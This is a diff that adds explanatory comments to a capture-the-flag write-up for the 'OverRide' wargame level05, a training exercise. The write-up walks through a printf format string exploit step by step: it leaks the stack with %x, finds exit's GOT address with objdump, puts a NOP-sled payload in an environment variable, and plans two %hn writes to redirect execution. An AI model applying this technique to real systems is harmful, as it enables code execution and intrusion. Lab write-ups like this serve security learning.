@@ -94,9 +94,22 @@ Dump of assembler code for function main:
    0x08048513 <+207>:	call   0x8048370 <exit@plt>
 End of assembler dump.
 
+*****************************************************************************
+We see that the buffer given to printf isn't protected so we can see the stack.
+*****************************************************************************
+
 level05@OverRide:~$ ./level05
 AAAAAAAAAAAAAAAAAAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
 aaaaaaaaaaaaaaaaaaaa 64 f7fcfac0 f7ec3af9 ffffd6af ffffd6ae 0 ffffffff ffffd734 f7fdb000 61616161 61616161 61616161 61616161 61616161 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520
+
+*****************************************************************************
+We can see that we have our fgets buffer at the 10th position. We will 
+overwrite the exit address of the GOT (global table offset) by a Nop address 
+of our payload placed in an environment variable PAYLOAD. We will utilise
+the '%n' option of printf.
+*****************************************************************************
+
+
 level05@OverRide:~$ objdump -R level05
 
 level05:     file format elf32-i386
@@ -111,6 +124,10 @@ OFFSET   TYPE              VALUE
 080497e0 R_386_JUMP_SLOT   exit
 080497e4 R_386_JUMP_SLOT   __libc_start_main
 
+*****************************************************************************
+We have the address of exit : 0x080497e0.
+*****************************************************************************
+
 level05@OverRide:~$ env -i payload=$(python /tmp/payload.py) gdb level05
 (gdb) x /200s environ
 ...
@@ -119,6 +136,14 @@ level05@OverRide:~$ env -i payload=$(python /tmp/payload.py) gdb level05
 0xffffdd17:  "\220\220\220\220\220\220\220\220\220...
 ...
 
+*****************************************************************************
+We have the address of our Nop's : 0xffffdd17.
+We don't need to pass this address in little endian.
+The %n of printf will write the value returned by printf at the address
+on the stack. 0xffffdd17 being more than the max output of printf we have to
+split the %n into two %hn who will write two short to form the complete address.
+So we need to calculate the two padding.
+*****************************************************************************
 
 hexa    dec   hex       dec 
 ffff = 65535 dd17 = 56599
